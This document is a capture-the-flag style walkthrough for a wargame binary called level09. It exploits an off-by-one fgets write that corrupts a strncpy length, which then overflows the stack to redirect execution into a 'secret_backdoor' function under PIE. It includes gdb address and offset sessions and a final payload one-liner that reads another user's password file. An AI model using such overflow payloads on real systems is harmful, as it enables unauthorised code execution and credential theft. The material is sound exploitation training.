## Brief
This program takes two user input: a username and a password.
## Exploit
The first function called: `set_username` uses `fgets` and write the 41 first byte of our input after the main buffer.
This will be used in order to overwrite `local14` which is then used as the length of strncpy in the `set_msg` function.
The second user input is in the `set_msg` function since we overwrote the length that we copied to `0xff` we can rewrite the return address.
The trick here is that the PIE is enabled so we need to retrieve the address of the function.
In gdb doing:
```bash
(gdb) info function secret_backdoor 
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000000000000088c  secret_backdoor
```
Will only give us the offset of the function which is `0x88c`.
We now need the real address and to do so we have to run the program.
```bash
(gdb) b main
Breakpoint 1 at 0xaac
(gdb) r
Starting program: /home/users/level09/level09 
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000

Breakpoint 1, 0x0000555555554aac in main ()
(gdb) info function secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor
```
We now have the correct address which is `0x000055555555488c`

To get the offset of the return address we use gdb as the pattern generator don't seem to work.

```bash
(gdb) disas handle_msg
Dump of assembler code for function handle_msg:
...
   0x0000555555554910 <+80>:	callq  0x5555555549cd <set_username>
...   
End of assembler dump.
(gdb) b *0x0000555555554910
Breakpoint 2 at 0x555555554910
(gdb) c
Continuing.
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------

Breakpoint 2, 0x0000555555554910 in handle_msg ()
(gdb) x/x $rbp + 8
0x7fffffffe5d8:	0x55554abd
(gdb) info reg rdi
rdi            0x7fffffffe510	140737488348432
(gdb) print rbp + 8 - rdi
No symbol table is loaded.  Use the "file" command.
(gdb) print $rbp + 8 - $rdi
$1 = (void *) 0xc8
```

The difference between the buffer and the return address is `0xc8` which is `200`.

## Commands
 
```bash
(python -c "print('\xff'*41)"; python -c "print('A'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00')"; echo "cat /home/users/end/.pass") | ./level09
```